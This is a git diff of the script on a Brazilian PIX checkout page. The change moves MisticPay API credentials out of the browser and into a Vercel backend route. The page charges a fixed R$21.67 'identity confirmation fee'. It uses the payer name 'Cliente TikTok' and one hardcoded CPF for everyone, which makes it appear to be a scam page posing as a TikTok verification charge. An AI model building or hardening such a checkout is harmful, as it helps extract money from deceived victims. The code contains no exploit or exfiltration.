@@ -158,12 +158,14 @@
 
     </div>
 
-    <script>
+<script>
         // ============================================
-        // CONFIGURAÇÕES
+        // CONFIGURAÇÕES GERAIS
         // ============================================
-        let MISTICPAY_CONFIG = null;
-        let PAYMENT_AMOUNT = 21.67;
+        // Não precisamos mais carregar config.json aqui.
+        // O servidor (backend) já tem as senhas seguras.
+        
+        const PAYMENT_AMOUNT = 21.67;
         const PAYER_NAME = 'Cliente TikTok';
         const PAYER_CPF = '580.506.946-66';
 
@@ -180,22 +182,12 @@
         const errorText = document.getElementById('error-text');
 
         // ============================================
-        // FUNÇÕES DE UI
+        // FUNÇÕES DE INTERFACE (UI)
         // ============================================
 
         // O usuário CLICOU no botão "Gerar PIX"
         async function handleGenerateClick() {
-            // Verifica se as configs carregaram
-            if (!MISTICPAY_CONFIG) {
-                // Tenta carregar de novo se falhou antes ou foi rápido demais
-                await loadConfig(); 
-                if(!MISTICPAY_CONFIG) {
-                    showError("Erro de configuração. Verifique o console.");
-                    return;
-                }
-            }
-            
-            // Inicia o processo
+            // Não carregamos mais config, vamos direto para a geração
             generatePayment();
         }
 
@@ -209,7 +201,6 @@
 
         function closeModal() {
             pixModal.classList.add('hidden');
-            // Opcional: mostrar a tela de checkout de novo ou redirecionar
         }
 
         function showError(msg) {
@@ -241,7 +232,6 @@
             
             const btn = document.getElementById('btn-copy-main');
             const btnText = document.getElementById('btn-text');
-            const originalBg = btn.className;
             
             btn.classList.remove('bg-green-600', 'hover:bg-green-700');
             btn.classList.add('bg-gray-800');
@@ -255,38 +245,9 @@
         }
 
         // ============================================
-        // LÓGICA DE API
+        // LÓGICA DE API (Backend)
         // ============================================
 
-        async function loadConfig() {
-            try {
-                const response = await fetch('config.json');
-                if (!response.ok) throw new Error();
-                const config = await response.json();
-                
-                let proxyUrl = config.misticpay.proxyUrl || '';
-                if (config.misticpay.useProxy && (!proxyUrl || proxyUrl.includes('localhost'))) {
-                    proxyUrl = `${window.location.origin}/api/create-transaction`;
-                }
-                
-                MISTICPAY_CONFIG = {
-                    clientId: config.misticpay.clientId,
-                    clientSecret: config.misticpay.clientSecret,
-                    apiBaseUrl: config.misticpay.apiBaseUrl || 'https://api.misticpay.com/api',
-                    useProxy: config.misticpay.useProxy || false,
-                    proxyUrl: proxyUrl
-                };
-                
-                PAYMENT_AMOUNT = config.payment?.amount || 21.67;
-                console.log('Configurações carregadas (Aguardando clique).');
-                
-            } catch (error) {
-                console.error("Erro ao carregar config.json", error);
-                // Não mostramos erro visual ainda, pois o usuário nem clicou
-            }
-        }
-
-        // Função principal chamada pelo botão
         async function generatePayment() {
             showLoading();
             
@@ -311,62 +272,55 @@
 
                     if (copyPaste) pixCopyPasteInput.value = copyPaste;
 
-                    // Esconde checkout, mostra modal
+                    // Mostra modal
                     pixModal.classList.remove('hidden');
                     
                 } else {
-                    throw new Error('Dados inválidos da API');
+                    throw new Error('Dados inválidos recebidos da API');
                 }
             } catch (error) {
                 console.error(error);
                 let msg = error.message;
-                if(msg.includes('Failed to fetch')) msg = "Erro de conexão (CORS/Network).";
+                if(msg.includes('Failed to fetch') || msg.includes('500')) {
+                    msg = "Erro ao comunicar com o servidor. Verifique as configurações na Vercel.";
+                }
                 showError(msg);
             } finally {
                 hideLoading();
             }
         }
 
-async function createPaymentTransaction(name, cpf) {
-            // Limpa o CPF visualmente apenas para envio limpo se necessário
-            const cleanDoc = cpf.replace(/\D/g, '');
+        async function createPaymentTransaction(name, cpf) {
+            // URL RELATIVA: Na Vercel, o backend está no mesmo domínio
+            // O vercel.json vai redirecionar /api/... para o server.js
+            const url = '/api/create-transaction';
             
-            // Nota: O valor e a descrição agora são forçados pelo server.js
-            // baseado no config.json para garantir que seja a taxa correta.
             const payload = {
                 payerName: name,
-                payerDocument: cleanDoc
+                payerDocument: cpf.replace(/\D/g, '')
+                // Valor e Descrição são definidos no Backend por segurança
             };
 
-            let url = `${MISTICPAY_CONFIG.apiBaseUrl}/transactions/create`;
-            let headers = { 'Content-Type': 'application/json' };
-            let body = payload;
+            const res = await fetch(url, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify(payload) 
+            });
 
-            // Sempre usará o proxy configurado no config.json
-            if (MISTICPAY_CONFIG.useProxy && MISTICPAY_CONFIG.proxyUrl) {
-                url = MISTICPAY_CONFIG.proxyUrl;
-                // No modo proxy, o server.js injeta as credenciais e o valor da taxa
-            } else {
-                // Caso use direto (não recomendado para produção)
-                headers['ci'] = MISTICPAY_CONFIG.clientId;
-                headers['cs'] = MISTICPAY_CONFIG.clientSecret;
-                // Se for direto, precisa enviar o valor daqui
-                body.amount = PAYMENT_AMOUNT;
-                body.description = "Taxa de Confirmacao de Identidade";
-                body.transactionId = 'txn_' + Date.now();
-            }
-
-            const res = await fetch(url, { method: 'POST', headers, body: JSON.stringify(body) });
-            
             if (!res.ok) {
-                const errText = await res.text();
-                throw new Error(`Erro API: ${res.status} - ${errText}`);
+                // Tenta ler o erro que veio do servidor
+                let errorDetails = "";
+                try {
+                    const errorJson = await res.json();
+                    errorDetails = errorJson.message || JSON.stringify(errorJson);
+                } catch(e) {
+                    errorDetails = res.statusText;
+                }
+                throw new Error(`Erro API (${res.status}): ${errorDetails}`);
             }
+            
             return await res.json();
         }
-
-        // Carrega configs ao abrir a página (mas não gera pagamento)
-        loadConfig();
 
     </script>
 </body>
